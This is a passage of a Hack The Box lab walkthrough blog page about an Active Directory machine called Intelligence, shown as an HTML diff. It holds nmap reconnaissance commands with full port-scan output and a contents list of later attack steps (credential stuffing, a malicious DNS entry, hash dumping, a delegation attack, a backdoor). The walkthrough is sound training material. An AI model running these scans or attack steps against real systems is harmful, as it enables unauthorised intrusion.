@@ -1,0 +1,1814 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+    <meta name="generator" content="Hugo 0.135.0">
+
+    
+
+    
+
+    
+        
+            <meta
+                name="description"
+                content="Saucy Monk" />
+        
+
+        
+            <meta
+                name="keywords"
+                content="hacking, AD" />
+        
+
+        
+            <meta name="author" content="bloodstiller" />
+        
+
+    
+
+
+    <title>
+        
+            Intelligence HTB Walkthrough |
+            Hack the planet
+        
+    </title>
+
+    
+
+
+    
+    
+
+    
+    
+
+
+    
+    
+
+
+    
+    
+
+
+    
+    
+
+    
+
+
+    
+    
+
+    
+
+    
+
+        
+            
+            <link
+                rel="stylesheet"
+                href="/reset.min_6107201571472815285.3662e40c85350bf0bcf308b7db81c173e4b690b862d3c3cde460de5155550bf055b7ff48cddb1cf5255e55f0355196d8dec1d49434b2457842cc77ebea198f3f.css"
+                integrity="sha512-NmLkDIU1C/C88wi324HBc&#43;S2kLhi08PN5GDeUVVVC/BVt/9Izdsc9SVeVfA1UZbY3sHUlDSyRXhCzHfr6hmPPw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/01_layout.5974c097ff194e0a64d31c28fc478cc38b6290fe28d2cc2dbf5ae52a66751db74e4e7374bc4e25f464ea679f74cd86c474a5367e05c2db34a1b9b273466691e0.css"
+                integrity="sha512-WXTAl/8ZTgpk0xwo/EeMw4tikP4o0swtv1rlKmZ1HbdOTnN0vE4l9GTqZ590zYbEdKU2fgXC2zShubJzRmaR4A==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/02_style.e6eadce601966e1bc2d798a6a4b94edc31360559ec0c7efd94e31d855914e918a88c9bddfabc11200357a22ce33ebdfd27c70fdd76cc8d155e9633bab42e0f76.css"
+                integrity="sha512-5urc5gGWbhvC15impLlO3DE2BVnsDH79lOMdhVkU6RiojJvd&#43;rwRIANXoizjPr39J8cP3XbMjRVeljO6tC4Pdg==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/03_home.6d64455a82e28b01e58f3c37541add9e36fc8ed87562dac91ff06da3f7f11b32ac1cacaa593b2ab2e01acd894659f66c249bd0a261f051038f19a8734c3e1243.css"
+                integrity="sha512-bWRFWoLiiwHljzw3VBrdnjb8jth1YtrJH/Bto/fxGzKsHKyqWTsqsuAazYlGWfZsJJvQomHwUQOPGahzTD4SQw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/04_responsive.065451199c1e1cd4f86ac1c8733e3c77eaf215b4972cefff7e7929a2837f5b2cc0e0a04f99f34d58e082812d6102c8cc9b358d21db784e9c4d5e5a8c79f4bc43.css"
+                integrity="sha512-BlRRGZweHNT4asHIcz48d&#43;ryFbSXLO//fnkpooN/WyzA4KBPmfNNWOCCgS1hAsjMmzWNIdt4TpxNXlqMefS8Qw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/05_markdown.c36845ad92ed66ad12c3fe7d5317167c3eab3361616252a52d1758063294d08a7ac6d218fdcd516973c7a9a66faf3ee9c3dec654a17dddda4444675e53e62785.css"
+                integrity="sha512-w2hFrZLtZq0Sw/59UxcWfD6rM2FhYlKlLRdYBjKU0Ip6xtIY/c1RaXPHqaZvrz7pw97GVKF93dpERGdeU&#43;YnhQ==" />
+        
+
+    
+
+
+    
+    
+
+    
+
+    
+
+    
+
+    
+</head>
+
+
+
+    <body>
+        <header class="header">
+    <div class="header_left">
+        
+    </div>
+
+    <div class="header_middle">
+        
+            Intelligence HTB Walkthrough -
+            Hack the planet
+        
+    </div>
+</header>
+
+
+
+        <main>
+            <aside class="sidebar">
+    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li
+                    
+                        class="dir opened-dir"
+                    >
+                    <span class="dir-text"> Walkthroughs </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/access-box/" title="./walkthroughs/access-box/">
+                        
+                            Access HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/intelligence-box/" title="./walkthroughs/intelligence-box/">
+                        
+                            Intelligence HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/manager-box/" title="./walkthroughs/manager-box/">
+                        
+                            Manager HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/remote-box/" title="./walkthroughs/remote-box/">
+                        
+                            Remote HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/return-box/" title="./walkthroughs/return-box/">
+                        
+                            Return HTB Box Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/support-box/" title="./walkthroughs/support-box/">
+                        
+                            Support HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/aboutme/" title="./aboutme/">
+                        
+                            about me
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+</aside>
+<aside class="exapandable"></aside>
+
+
+            
+    <article class="main">
+        <button
+    class="sidebar-toggle-btn"
+    type="menu"
+    aria-expanded="false"
+    aria-haspopup="true">
+    <i class="bi bi-list"></i>
+</button>
+
+
+
+        <div class="title">
+            <h1 class="title-header">
+                Intelligence HTB Walkthrough
+            </h1>
+
+            <div class="author-date-readtime">
+                
+
+                    
+                        <div class="author" title="Author">
+                            <i class="bi bi-person"></i>
+                            <a
+                                href="/author/bloodstiller/"
+                                class="cat-btn">
+                                bloodstiller
+                            </a>
+                        </div>
+                    
+
+                
+
+                
+                    <div class="date" title="Date">
+                        <i class="bi bi-calendar3"></i>
+                        <time
+                            datetime="0001.01.01"
+                            >0001.01.01
+                        </time>
+                    </div>
+                
+
+                
+                    <div
+                        class="readtime"
+                        title="Time to Read">
+                        <i class="bi bi-clock"></i>
+                        19 mins to read
+                    </div>
+                
+            </div>
+        </div>
+
+        <div class="article-meta">
+            
+
+            
+                <div class="tags">
+                    <i
+                        class="bi bi-tags"
+                        title="Tags"></i>
+                    
+                        <a
+                            href="/tags/box/"
+                            class="tag-btn">
+                            Box
+                        </a>
+                    
+                        <a
+                            href="/tags/htb/"
+                            class="tag-btn">
+                            HTB
+                        </a>
+                    
+                        <a
+                            href="/tags/active-directory/"
+                            class="tag-btn">
+                            Active Directory
+                        </a>
+                    
+                        <a
+                            href="/tags/windows/"
+                            class="tag-btn">
+                            Windows
+                        </a>
+                    
+                        <a
+                            href="/tags/kerberos/"
+                            class="tag-btn">
+                            Kerberos
+                        </a>
+                    
+                        <a
+                            href="/tags/kcd/"
+                            class="tag-btn">
+                            KCD
+                        </a>
+                    
+                        <a
+                            href="/tags/dns/"
+                            class="tag-btn">
+                            DNS
+                        </a>
+                    
+                </div>
+            
+
+            
+                <div class="breadcumb">
+                    <i class="bi bi-folder"></i>
+                    
+    
+    
+
+
+
+
+<a href="http://localhost:1313/" class="bread-btn">
+    
+        <i class="bi bi-house-fill"></i>
+    
+
+    
+        Home
+    
+</a>
+
+
+
+
+    /
+
+
+
+<a href="http://localhost:1313/walkthroughs/" class="bread-btn">
+    
+
+    
+        Walkthroughs
+    
+</a>
+
+
+
+
+    /
+
+
+
+<a href="http://localhost:1313/walkthroughs/intelligence-box/" class="bread-btn">
+    
+
+    
+        
+            Intelligence HTB Walkthrough
+        
+
+    
+</a>
+
+                </div>
+            
+
+            
+        </div>
+
+        
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#name-of-box-intelligence">Name of box: - Intelligence</a></li>
+    <li><a href="#1-dot-enumeration">1. Enumeration:</a>
+      <ul>
+        <li><a href="#nmap">NMAP:</a></li>
+        <li><a href="#dns-53">DNS <code>53</code>:</a></li>
+        <li><a href="#ldap-389">LDAP <code>389</code>:</a></li>
+        <li><a href="#smb-445">SMB <code>445</code>:</a></li>
+        <li><a href="#http-80">HTTP <code>80</code>:</a></li>
+      </ul>
+    </li>
+    <li><a href="#2-dot-foothold">2. Foothold:</a>
+      <ul>
+        <li><a href="#credential-stuffing-with-netexec">Credential Stuffing with netexec:</a></li>
+        <li><a href="#credentialed-smb-enumeration">Credentialed SMB Enumeration:</a></li>
+      </ul>
+    </li>
+    <li><a href="#3-dot-lateral-movement-and-privilege-escalation">3. Lateral Movement &amp; Privilege Escalation:</a>
+      <ul>
+        <li><a href="#adding-a-malicious-dns-entry-using-dnstool-dot-py">Adding a Malicious DNS Entry using <code>dnstool.py</code>:</a></li>
+        <li><a href="#cracking-teds-hash-using-hashcat">Cracking Teds Hash using Hashcat:</a></li>
+        <li><a href="#running-bloodhound-as-ted-graves">Running Bloodhound as Ted Graves:</a></li>
+        <li><a href="#using-gmsadumper-dot-py-to-dump-the-gmsa-password">Using <code>gMSADumper.py</code> to dump the <code>gMSA</code> Password:</a></li>
+      </ul>
+    </li>
+    <li><a href="#4-dot-ownership">4. Ownership:</a>
+      <ul>
+        <li><a href="#1-dot-clock-synchronization-to-ensure-kerberos-tickets-are-valid">1. Clock Synchronization To Ensure Kerberos Tickets Are Valid:</a></li>
+        <li><a href="#2-dot-kerberos-constrained-delegation--kcd--attack">2. Kerberos Constrained Delegation (KCD) Attack:</a></li>
+        <li><a href="#3-dot-load-the-dot-ccache-into-memory-with-the-krb5ccname-variable">3. Load the <code>.ccache</code> into memory with the <code>KRB5CCNAME</code> variable:</a></li>
+        <li><a href="#4-dot-getting-a-shell-using-impacket-psexec">4. Getting a shell using impacket-psexec:</a></li>
+      </ul>
+    </li>
+    <li><a href="#5-dot-ownership">5. Ownership:</a>
+      <ul>
+        <li><a href="#dumping-ntds-using-netexec-and-our-kerberos-credentials">Dumping NTDS using netexec and our kerberos credentials:</a></li>
+      </ul>
+    </li>
+    <li><a href="#6-dot-persistence">6. Persistence:</a>
+      <ul>
+        <li><a href="#creating-a-windows-scheduled-task-to-enable-a-backdoor-dot">Creating a windows scheduled task to enable a backdoor.</a></li>
+      </ul>
+    </li>
+    <li><a href="#lessons-learned">Lessons Learned:</a>
+      <ul>
+        <li><a href="#what-did-i-learn">What did I learn?</a></li>
+        <li><a href="#what-silly-mistakes-did-i-make">What silly mistakes did I make?</a></li>
+      </ul>
+    </li>
+    <li><a href="#sign-off">Sign off:</a></li>
+  </ul>
+</nav>
+        
+
+
+        <div class="content">
+            
+                <h2 id="name-of-box-intelligence">Name of box: - Intelligence</h2>
+<h2 id="1-dot-enumeration">1. Enumeration:</h2>
+<h3 id="nmap">NMAP:</h3>
+<ul>
+<li>
+<p><strong>Basic Scan</strong>:</p>
+<ul>
+<li><code>nmap $box -Pn -oA basicScan</code>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="%20%20kali%20in%2046-Boxes/46.02-HTB/BlogEntriesMade/Intelligence/scans%20%202GiB/7GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%0a%20%20%f0%9f%95%99%2016:27:13%20zsh%20%e2%9d%af%20nmap%20$box%20-Pn%20-oA%20basicScan%0a%20%20Starting%20Nmap%207.94SVN%20%28%20https://nmap.org%20%29%20at%202024-09-27%2016:27%20BST%0a%20%20Nmap%20scan%20report%20for%2010.129.95.154%0a%20%20Host%20is%20up%20%280.039s%20latency%29.%0a%20%20Not%20shown:%20988%20filtered%20tcp%20ports%20%28no-response%29%0a%20%20PORT%20%20%20%20%20STATE%20SERVICE%0a%20%2053/tcp%20%20%20open%20%20domain%0a%20%2080/tcp%20%20%20open%20%20http%0a%20%2088/tcp%20%20%20open%20%20kerberos-sec%0a%20%20135/tcp%20%20open%20%20msrpc%0a%20%20139/tcp%20%20open%20%20netbios-ssn%0a%20%20389/tcp%20%20open%20%20ldap%0a%20%20445/tcp%20%20open%20%20microsoft-ds%0a%20%20464/tcp%20%20open%20%20kpasswd5%0a%20%20593/tcp%20%20open%20%20http-rpc-epmap%0a%20%20636/tcp%20%20open%20%20ldapssl%0a%20%203268/tcp%20open%20%20globalcatLDAP%0a%20%203269/tcp%20open%20%20globalcatLDAPssl">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>  kali in 46-Boxes/46.02-HTB/BlogEntriesMade/Intelligence/scans  2GiB/7GiB | 0B/1GiB with /usr/bin/zsh
+</span></span><span style="display:flex;"><span>  🕙 16:27:13 zsh ❯ nmap $box -Pn -oA basicScan
+</span></span><span style="display:flex;"><span>  Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-09-27 16:27 BST
+</span></span><span style="display:flex;"><span>  Nmap scan report <span style="color:#66d9ef">for</span> 10.129.95.154
+</span></span><span style="display:flex;"><span>  Host is up <span style="color:#f92672">(</span>0.039s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>  Not shown: <span style="color:#ae81ff">988</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  PORT     STATE SERVICE
+</span></span><span style="display:flex;"><span>  53/tcp   open  domain
+</span></span><span style="display:flex;"><span>  80/tcp   open  http
+</span></span><span style="display:flex;"><span>  88/tcp   open  kerberos-sec
+</span></span><span style="display:flex;"><span>  135/tcp  open  msrpc
+</span></span><span style="display:flex;"><span>  139/tcp  open  netbios-ssn
+</span></span><span style="display:flex;"><span>  389/tcp  open  ldap
+</span></span><span style="display:flex;"><span>  445/tcp  open  microsoft-ds
+</span></span><span style="display:flex;"><span>  464/tcp  open  kpasswd5
+</span></span><span style="display:flex;"><span>  593/tcp  open  http-rpc-epmap
+</span></span><span style="display:flex;"><span>  636/tcp  open  ldapssl
+</span></span><span style="display:flex;"><span>  3268/tcp open  globalcatLDAP
+</span></span><span style="display:flex;"><span>  3269/tcp open  globalcatLDAPssl</span></span></code></pre></div>
+    
+</div>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>In depth scan</strong>:</p>
+<ul>
+<li>
+<p><code>sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP</code></p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="%20%20kali%20in%2046-Boxes/46.02-HTB/BlogEntriesMade/Intelligence/scans%20%202GiB/7GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%20%20took%2010s%0a%20%20%f0%9f%95%99%2016:27:28%20zsh%20%e2%9d%af%20sudo%20nmap%20-p-%20-sV%20-sC%20-O%20-Pn%20--disable-arp-ping%20$box%20-oA%20FullTCP%0a%20%20[sudo]%20password%20for%20kali:%0a%20%20Starting%20Nmap%207.94SVN%20%28%20https://nmap.org%20%29%20at%202024-09-27%2016:28%20BST%0a%20%20Nmap%20scan%20report%20for%2010.129.95.154%0a%20%20Host%20is%20up%20%280.078s%20latency%29.%0a%20%20Not%20shown:%2065516%20filtered%20tcp%20ports%20%28no-response%29%0a%20%20PORT%20%20%20%20%20%20STATE%20SERVICE%20%20%20%20%20%20%20VERSION%0a%20%2053/tcp%20%20%20%20open%20%20domain%20%20%20%20%20%20%20%20Simple%20DNS%20Plus%0a%20%2080/tcp%20%20%20%20open%20%20http%20%20%20%20%20%20%20%20%20%20Microsoft%20IIS%20httpd%2010.0%0a%20%20%7c_http-server-header:%20Microsoft-IIS/10.0%0a%20%20%7c%20http-methods:%0a%20%20%7c_%20%20Potentially%20risky%20methods:%20TRACE%0a%20%20%7c_http-title:%20Intelligence%0a%20%2088/tcp%20%20%20%20open%20%20kerberos-sec%20%20Microsoft%20Windows%20Kerberos%20%28server%20time:%202024-09-27%2022:30:53Z%29%0a%20%20135/tcp%20%20%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a%20%20139/tcp%20%20%20open%20%20netbios-ssn%20%20%20Microsoft%20Windows%20netbios-ssn%0a%20%20389/tcp%20%20%20open%20%20ldap%20%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20Active%20Directory%20LDAP%20%28Domain:%20intelligence.htb0.,%20Site:%20Default-First-Site-Name%29%0a%20%20%7c_ssl-date:%202024-09-27T22:32:28&#43;00:00;%20&#43;7h00m00s%20from%20scanner%20time.%0a%20%20%7c%20ssl-cert:%20Subject:%20commonName=dc.intelligence.htb%0a%20%20%7c%20Subject%20Alternative%20Name:%20othername:%201.3.6.1.4.1.311.25.1::%3cunsupported%3e,%20DNS:dc.intelligence.htb%0a%20%20%7c%20Not%20valid%20before:%202021-04-19T00:43:16%0a%20%20%7c_Not%20valid%20after:%20%202022-04-19T00:43:16%0a%20%20445/tcp%20%20%20open%20%20microsoft-ds?%0a%20%20464/tcp%20%20%20open%20%20kpasswd5?%0a%20%20593/tcp%20%20%20open%20%20ncacn_http%20%20%20%20Microsoft%20Windows%20RPC%20over%20HTTP%201.0%0a%20%20636/tcp%20%20%20open%20%20ssl/ldap%20%20%20%20%20%20Microsoft%20Windows%20Active%20Directory%20LDAP%20%28Domain:%20intelligence.htb0.,%20Site:%20Default-First-Site-Name%29%0a%20%20%7c_ssl-date:%202024-09-27T22:32:31&#43;00:00;%20&#43;7h00m00s%20from%20scanner%20time.%0a%20%20%7c%20ssl-cert:%20Subject:%20commonName=dc.intelligence.htb%0a%20%20%7c%20Subject%20Alternative%20Name:%20othername:%201.3.6.1.4.1.311.25.1::%3cunsupported%3e,%20DNS:dc.intelligence.htb%0a%20%20%7c%20Not%20valid%20before:%202021-04-19T00:43:16%0a%20%20%7c_Not%20valid%20after:%20%202022-04-19T00:43:16%0a%20%203268/tcp%20%20open%20%20ldap%20%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20Active%20Directory%20LDAP%20%28Domain:%20intelligence.htb0.,%20Site:%20Default-First-Site-Name%29%0a%20%20%7c_ssl-date:%202024-09-27T22:32:30&#43;00:00;%20&#43;7h00m00s%20from%20scanner%20time.%0a%20%20%7c%20ssl-cert:%20Subject:%20commonName=dc.intelligence.htb%0a%20%20%7c%20Subject%20Alternative%20Name:%20othername:%201.3.6.1.4.1.311.25.1::%3cunsupported%3e,%20DNS:dc.intelligence.htb%0a%20%20%7c%20Not%20valid%20before:%202021-04-19T00:43:16%0a%20%20%7c_Not%20valid%20after:%20%202022-04-19T00:43:16%0a%20%203269/tcp%20%20open%20%20ssl/ldap%20%20%20%20%20%20Microsoft%20Windows%20Active%20Directory%20LDAP%20%28Domain:%20intelligence.htb0.,%20Site:%20Default-First-Site-Name%29%0a%20%20%7c%20ssl-cert:%20Subject:%20commonName=dc.intelligence.htb%0a%20%20%7c%20Subject%20Alternative%20Name:%20othername:%201.3.6.1.4.1.311.25.1::%3cunsupported%3e,%20DNS:dc.intelligence.htb%0a%20%20%7c%20Not%20valid%20before:%202021-04-19T00:43:16%0a%20%20%7c_Not%20valid%20after:%20%202022-04-19T00:43:16%0a%20%20%7c_ssl-date:%202024-09-27T22:32:27&#43;00:00;%20&#43;7h00m00s%20from%20scanner%20time.%0a%20%209389/tcp%20%20open%20%20mc-nmf%20%20%20%20%20%20%20%20.NET%20Message%20Framing%0a%20%2049667/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a%20%2049691/tcp%20open%20%20ncacn_http%20%20%20%20Microsoft%20Windows%20RPC%20over%20HTTP%201.0%0a%20%2049692/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a%20%2049710/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a%20%2049713/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a%20%2049737/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a%20%20Warning:%20OSScan%20results%20may%20be%20unreliable%20because%20we%20could%20not%20find%20at%20least%201%20open%20and%201%20closed%20port%0a%20%20Device%20type:%20general%20purpose%0a%20%20Running%20%28JUST%20GUESSING%29:%20Microsoft%20Windows%202019%20%2889%25%29%0a%20%20Aggressive%20OS%20guesses:%20Microsoft%20Windows%20Server%202019%20%2889%25%29%0a%20%20No%20exact%20OS%20matches%20for%20host%20%28test%20conditions%20non-ideal%29.%0a%20%20Service%20Info:%20Host:%20DC;%20OS:%20Windows;%20CPE:%20cpe:/o:microsoft:windows%0a%0a%20%20Host%20script%20results:%0a%20%20%7c_clock-skew:%20mean:%206h59m59s,%20deviation:%200s,%20median:%206h59m59s%0a%20%20%7c%20smb2-security-mode:%0a%20%20%7c%20%20%203:1:1:%0a%20%20%7c_%20%20%20%20Message%20signing%20enabled%20and%20required%0a%20%20%7c%20smb2-time:%0a%20%20%7c%20%20%20date:%202024-09-27T22:31:48%0a%20%20%7c_%20%20start_date:%20N/A%0a%0a%20%20OS%20and%20Service%20detection%20performed.%20Please%20report%20any%20incorrect%20results%20at%20https://nmap.org/submit/%20.%0a%20%20Nmap%20done:%201%20IP%20address%20%281%20host%20up%29%20scanned%20in%20255.43%20seconds">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>  kali in 46-Boxes/46.02-HTB/BlogEntriesMade/Intelligence/scans  2GiB/7GiB | 0B/1GiB with /usr/bin/zsh  took 10s
+</span></span><span style="display:flex;"><span>  🕙 16:27:28 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali:
+</span></span><span style="display:flex;"><span>  Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-09-27 16:28 BST
+</span></span><span style="display:flex;"><span>  Nmap scan report <span style="color:#66d9ef">for</span> 10.129.95.154
+</span></span><span style="display:flex;"><span>  Host is up <span style="color:#f92672">(</span>0.078s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>  Not shown: <span style="color:#ae81ff">65516</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  PORT      STATE SERVICE       VERSION
+</span></span><span style="display:flex;"><span>  53/tcp    open  domain        Simple DNS Plus
+</span></span><span style="display:flex;"><span>  80/tcp    open  http          Microsoft IIS httpd 10.0
+</span></span><span style="display:flex;"><span>  |_http-server-header: Microsoft-IIS/10.0
+</span></span><span style="display:flex;"><span>  | http-methods:
+</span></span><span style="display:flex;"><span>  |_  Potentially risky methods: TRACE
+</span></span><span style="display:flex;"><span>  |_http-title: Intelligence
+</span></span><span style="display:flex;"><span>  88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2024-09-27 22:30:53Z<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>  139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>  389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: intelligence.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  |_ssl-date: 2024-09-27T22:32:28+00:00; +7h00m00s from scanner time.
+</span></span><span style="display:flex;"><span>  | ssl-cert: Subject: commonName<span style="color:#f92672">=</span>dc.intelligence.htb
+</span></span><span style="display:flex;"><span>  | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.intelligence.htb
+</span></span><span style="display:flex;"><span>  | Not valid before: 2021-04-19T00:43:16
+</span></span><span style="display:flex;"><span>  |_Not valid after:  2022-04-19T00:43:16
+</span></span><span style="display:flex;"><span>  445/tcp   open  microsoft-ds?
+</span></span><span style="display:flex;"><span>  464/tcp   open  kpasswd5?
+</span></span><span style="display:flex;"><span>  593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>  636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: intelligence.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  |_ssl-date: 2024-09-27T22:32:31+00:00; +7h00m00s from scanner time.
+</span></span><span style="display:flex;"><span>  | ssl-cert: Subject: commonName<span style="color:#f92672">=</span>dc.intelligence.htb
+</span></span><span style="display:flex;"><span>  | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.intelligence.htb
+</span></span><span style="display:flex;"><span>  | Not valid before: 2021-04-19T00:43:16
+</span></span><span style="display:flex;"><span>  |_Not valid after:  2022-04-19T00:43:16
+</span></span><span style="display:flex;"><span>  3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: intelligence.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  |_ssl-date: 2024-09-27T22:32:30+00:00; +7h00m00s from scanner time.
+</span></span><span style="display:flex;"><span>  | ssl-cert: Subject: commonName<span style="color:#f92672">=</span>dc.intelligence.htb
+</span></span><span style="display:flex;"><span>  | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.intelligence.htb
+</span></span><span style="display:flex;"><span>  | Not valid before: 2021-04-19T00:43:16
+</span></span><span style="display:flex;"><span>  |_Not valid after:  2022-04-19T00:43:16
+</span></span><span style="display:flex;"><span>  3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: intelligence.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  | ssl-cert: Subject: commonName<span style="color:#f92672">=</span>dc.intelligence.htb
+</span></span><span style="display:flex;"><span>  | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.intelligence.htb
+</span></span><span style="display:flex;"><span>  | Not valid before: 2021-04-19T00:43:16
+</span></span><span style="display:flex;"><span>  |_Not valid after:  2022-04-19T00:43:16
+</span></span><span style="display:flex;"><span>  |_ssl-date: 2024-09-27T22:32:27+00:00; +7h00m00s from scanner time.
+</span></span><span style="display:flex;"><span>  9389/tcp  open  mc-nmf        .NET Message Framing
+</span></span><span style="display:flex;"><span>  49667/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>  49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>  49692/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>  49710/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>  49713/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>  49737/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>  Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
+</span></span><span style="display:flex;"><span>  Device type: general purpose
+</span></span><span style="display:flex;"><span>  Running <span style="color:#f92672">(</span>JUST GUESSING<span style="color:#f92672">)</span>: Microsoft Windows <span style="color:#ae81ff">2019</span> <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  Aggressive OS guesses: Microsoft Windows Server <span style="color:#ae81ff">2019</span> <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>  Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  Host script results:
+</span></span><span style="display:flex;"><span>  |_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
+</span></span><span style="display:flex;"><span>  | smb2-security-mode:
+</span></span><span style="display:flex;"><span>  |   3:1:1:
+</span></span><span style="display:flex;"><span>  |_    Message signing enabled and required
+</span></span><span style="display:flex;"><span>  | smb2-time:
+</span></span><span style="display:flex;"><span>  |   date: 2024-09-27T22:31:48
+</span></span><span style="display:flex;"><span>  |_  start_date: N/A
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
